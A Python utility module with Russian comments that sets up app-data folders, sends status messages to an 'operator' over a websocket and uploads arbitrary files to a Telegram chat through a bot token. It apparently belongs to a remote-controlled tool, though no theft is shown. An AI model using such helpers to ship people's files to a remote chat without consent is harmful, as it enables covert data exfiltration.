# Файл: utils.py
import os
import requests
import json
import asyncio
import settings # <-- Импортируем наш ИСПРАВЛЕННЫЙ settings

# ==============================================================================
# ВОТ КЛЮЧЕВОЕ ИСПРАВЛЕНИЕ: Теперь эта строка РАБОТАЕТ,
# потому что settings.APP_DATA_PATH СУЩЕСТВУЕТ.
# ==============================================================================
TEMP_PATH = os.path.join(settings.APP_DATA_PATH, "temp")

# Создаём рабочие папки
os.makedirs(settings.APP_DATA_PATH, exist_ok=True)
os.makedirs(TEMP_PATH, exist_ok=True)

def send_status_to_operator(ws, loop, message):
    """Отправляет статус оператору, используя aiohttp."""
    if ws and not ws.closed:
        try:
            payload = json.dumps({'type': 'status', 'data': message})
            asyncio.run_coroutine_threadsafe(ws.send_str(payload), loop)
        except Exception as e:
            print(f"[!] Не удалось отправить статус: {e}")

def send_telegram_document(file_path, caption=""):
    """Отправляет документ в Telegram."""
    url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, "rb") as f:
            response = requests.post(url, files={'document': f}, data={'chat_id': settings.CHAT_ID, 'caption': caption}, timeout=20)
            return response.status_code == 200
    except Exception as e:
        print(f"[!!!] Критическая ошибка отправки документа в Telegram: {e}")
        return False
